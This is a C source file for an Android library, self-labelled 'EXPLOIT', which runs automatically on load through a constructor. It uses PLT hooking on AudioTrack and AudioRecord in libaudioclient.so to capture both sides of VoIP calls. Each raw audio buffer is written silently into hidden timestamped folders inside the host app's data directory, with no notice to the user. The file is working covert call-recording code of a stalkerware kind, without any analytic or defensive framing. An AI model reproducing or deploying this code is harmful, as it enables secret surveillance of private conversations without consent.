#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<stdbool.h>
#include <sys/stat.h>

#include<time.h>
#include "../include/plthook.h"

#include <android/api-level.h>

#include <android/log.h>
#define  logger(...)  __android_log_print(ANDROID_LOG_VERBOSE, "EXPLOIT", __VA_ARGS__)

FILE *f;

typedef int32_t status_t;
//from android source code
struct Buffer
{
        // FIXME use m prefix
        size_t      frameCount;     // number of sample frames corresponding to size;
                                    // on input to obtainBuffer() it is the number of frames desired
                                    // on output from obtainBuffer() it is the number of available
                                    //    frames to be read
                                    // on input to releaseBuffer() it is currently ignored
        size_t      size;           // input/output in bytes == frameCount * frameSize
                                    // on input to obtainBuffer() it is ignored
                                    // on output from obtainBuffer() it is the number of available
                                    //    bytes to be read, which is frameCount * frameSize
                                    // on input to releaseBuffer() it is the number of bytes to
                                    //    release
                                    // FIXME This is redundant with respect to frameCount.  Consider
                                    //    removing size and making frameCount the primary field.
        union {
            void*       raw;
            int16_t*    i16;        // signed 16-bit
            int8_t*     i8;         // unsigned 8-bit, offset by 0x80
                                    // input to obtainBuffer(): unused, output: pointer to buffer
        };
};

#define MAX_FILE_PATH_LEN 200
struct rec{
	void* id;
	FILE* fileHandle;
	char fileName[MAX_FILE_PATH_LEN];
};


struct rec* recList[20] = {NULL};
char saveDir[256];
int dir_saved = 0;
time_t ts;
int reset_time = 1;

void addEle(struct rec** list,int size, void *thisPtr, FILE *handle, char* filePath)
{
	for(int i=0;i<size;i++)
	{
		if(list[i] == NULL)
		{
			struct rec *ele = (struct rec*)malloc(sizeof(struct rec));
			ele->id = thisPtr;
			ele->fileHandle = handle;
			strcpy(ele->fileName, filePath); 
			list[i] = ele;
			return;
		}
	}
}

FILE* getEle(struct rec** list,int size, void* thisPtr)
{
	for(int i=0;i<size;i++)
	{
		if(list[i] != NULL)
		{
			if(list[i]->id == thisPtr)
			{
				return list[i]->fileHandle;
			}
		}
	}
	return NULL;
}

char* getFileName(struct rec** list,int size, void* thisPtr)
{
	for(int i=0;i<size;i++)
	{
		if(list[i] != NULL)
		{
			if(list[i]->id == thisPtr)
			{
				return list[i]->fileName;
			}
		}
	}
	return NULL;
}

void removeEle(struct rec** list,int size, void* thisPtr)
{
	for(int i=0;i<size;i++)
	{
		if(list[i] != NULL)
		{
			if(list[i]->id == thisPtr)
			{
				list[i] = NULL;
				return;
			}
		}
	}
}


static char *rand_string(char *str, size_t size)
{
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJK";
    if (size) {
        --size;
        for (size_t n = 0; n < size; n++) {
            int key = rand() % (int) (sizeof charset - 1);
            str[n] = charset[key];
        }
        str[size] = '\0';
    }
    return str;
}

char* rand_string_alloc(size_t size)
{
     char *s = malloc(size + 1);
     if (s) {
         rand_string(s, size);
     }
     return s;
}

char* getSelfProcessName()
{
	char path[] = "/proc/self/cmdline";
	FILE *cmdline = fopen(path, "r");
	char *application_id = (char*)malloc(64);
	memset(application_id,0,64);
	if (cmdline) {

		fread(application_id, 64, 1, cmdline);
		fclose(cmdline);
	}
	return application_id;
}

void createFolders()
{
	if (dir_saved == 1)
		return;

	char* p = getSelfProcessName();
	strcat(saveDir,"/data/data/");
	strcat(saveDir,p);
	strcat(saveDir,"/coip/");
	dir_saved = 1;

	struct stat st = {0};
	if (stat(saveDir, &st) == -1) {
		mkdir(saveDir, 0700);
	}

	logger("Current process name %s", p);
}

//start of audio track
status_t (*realTrackStart)(void* this);
status_t hookedTrackStart(void* this)
{
	logger("hookedTrackStart");
	return (*realTrackStart)(this);
}

status_t (*realTrackStop)(void* this);
status_t hookedTrackStop(void* this)
{
    logger("hookedTrackStop");
    //reset_time = 1; // sometimes getting called in between hence causing multiple folder creation. Removed this line to fix
    FILE *out = getEle(recList,20,this);
	if(out != NULL)
	{
		fflush(out);
		fclose(out);
		char* fName = getFileName(recList, 20, this);
		char newFileName[MAX_FILE_PATH_LEN];
		sprintf(newFileName,"%s.ac",fName);
		rename(fName,newFileName);
		removeEle(recList,20,this);
	}
	return (*realTrackStop)(this);
}

//start of audiorecor
status_t (*realRecordStart)(void* this,void *a,void *b);
status_t hookedRecordStart(void* this,void *a,void *b)
{
	logger("hookedRecordStart");
    return (*realRecordStart)(this,a,b);
}

status_t (*realRecordStop)(void* this);
status_t hookedRecordStop(void* this)
{
    logger("hookedRecordStop");
    reset_time = 1;
	FILE *out = getEle(recList,20,this);
	if(out != NULL)
	{
		fflush(out);
		fclose(out);
		char* fName = getFileName(recList, 20, this);
		char newFileName[MAX_FILE_PATH_LEN];
		sprintf(newFileName,"%s.bc",fName);
		rename(fName,newFileName);
		removeEle(recList,20,this);
	}
	return (*realRecordStop)(this);
}

FILE* getFile(void* thisPtr, int isAC)
{
	FILE* handle;
	createFolders();

    // Need not create voip for voice note listen
    if (isAC == 1 && reset_time == 1)
        return NULL;

	if((handle = getEle(recList,20,thisPtr)) == NULL)
	{
        // Find the current timestamp
        if (reset_time == 1)
        {
            ts = time(NULL);
            logger("Generating new time stamp");
            reset_time = 0;
        }
        char *folderName[MAX_FILE_PATH_LEN];
        sprintf(folderName, "voip_%ld/", ts);

        // Create folder with timestamp as name
        char *folderPath[MAX_FILE_PATH_LEN];
        sprintf(folderPath,"%s%s",saveDir,folderName);
        mkdir(folderPath, 0700);
        logger("Folder path %s", folderPath);

		char* fileName = rand_string_alloc(10);
		char* filePath[MAX_FILE_PATH_LEN];
		sprintf(filePath,"%s%s%s",saveDir,folderName,fileName);
		handle = fopen(filePath, "wb");
		addEle(recList,20, thisPtr, handle, filePath);
		return handle;
	}
	else
		return handle;
}
bool ifMic = 0;


void (*realTrackReleaseBuffer)(void* this,const struct Buffer*);
void hookedTrackReleaseBuffer(void* this, void* audioBuffer)
{
	struct Buffer *b = (struct Buffer*)audioBuffer;
	if(b->size > 0)
	{
		if(ifMic == 1)
		{
			FILE* out = getFile(this, 1);
			if (out != NULL)
			{
                fwrite(b->raw,1,b->size,out);
                fflush(out);
			}
		}
	}
	(*realTrackReleaseBuffer)(this,audioBuffer);
}

status_t (*realRecordObtainBuffer)(void* this, struct Buffer*, const struct timespec *, struct timespec *, size_t *);
status_t hookedRecordObtainBuffer(void* this, void* audioBuffer, const struct timespec *requested, struct timespec *elapsed, size_t *nonContig)
{
	status_t ret = (*realRecordObtainBuffer)(this,audioBuffer, requested, elapsed,nonContig);
	if(ret>=0)
	{
		struct Buffer *b = (struct Buffer*)audioBuffer; 
		if(b->size > 0)
		{
			ifMic = 1;
			FILE* out = getFile(this, 0);
			fwrite(b->raw,1,b->size,out);
			fflush(out);
		}
	}
	return ret;
}

//void print_plt_entries(const char *filename)
//{
//    plthook_t *plthook;
//    unsigned int pos = 0; /* This must be initialized with zero. */
//    const char *name;
//    void **addr;
//
//    if (plthook_open(&plthook, filename) != 0) {
//        fprintf(f,"plthook_open error: %s\n", plthook_error());
//    }
//    while (plthook_enum(plthook, &pos, &name, &addr) == 0) {
//        fprintf(f,"%p(%p) %s\n", addr, *addr, name);
//    }
//    plthook_close(plthook);
//}


void hookObtainbuffer(){
	plthook_t *plthook;

	//register start stop of android track
    if (plthook_open(&plthook, "/system/lib64/libaudioclient.so") != 0) {
       	logger("plthook_replace error: %s\n", plthook_error());
    }

    if (plthook_replace(plthook, "_ZN7android10AudioTrack5startEv", (void*)hookedTrackStart, (void*)&realTrackStart) != 0) {
    }

	if (plthook_replace(plthook, "_ZN7android10AudioTrack4stopEv", (void*)hookedTrackStop, (void*)&realTrackStop) != 0) {
    }

	//register start stop of android record
	if (plthook_replace(plthook, "_ZN7android11AudioRecord4stopEv", (void*)hookedRecordStop, (void*)&realRecordStop) != 0) {
    }

	//for recording downlink
	if (plthook_replace(plthook, "_ZN7android10AudioTrack13releaseBufferEPKNS0_6BufferE", (void*)hookedTrackReleaseBuffer, (void*)&realTrackReleaseBuffer) != 0) {
       logger("plthook_replace error: %s\n", plthook_error());
       plthook_close(plthook);
    }

	//for recording uplink
	// if(android_get_device_api_level() < 30)
	// {
    	if (plthook_replace(plthook, "_ZN7android11AudioRecord12obtainBufferEPNS0_6BufferEPK8timespecPS3_Pm", (void*)hookedRecordObtainBuffer, (void*)&realRecordObtainBuffer) != 0) {
    	}
	// }
	// else
	// {
		// if (plthook_replace(plthook, "_ZN7android11AudioRecord12obtainBufferEPNS0_6BufferEPK8timespecPS3_Pj", (void*)hookedRecordObtainBuffer, (void*)&realRecordObtainBuffer) != 0) {
    	// }
	// }
	logger("All hooked");

    plthook_close(plthook);
}

int __attribute__((constructor)) main() {

	logger("EXPLOIT: IN JNI>>>>>>>>>>>>>>>>");
    logger("EXPLOIT: from bin.....");
    logger(" I am the parent process, my UID is = %d" , getuid());
    logger(" I am the parent process, my PID is = %d" , getpid());

	hookObtainbuffer();

	return 0;
}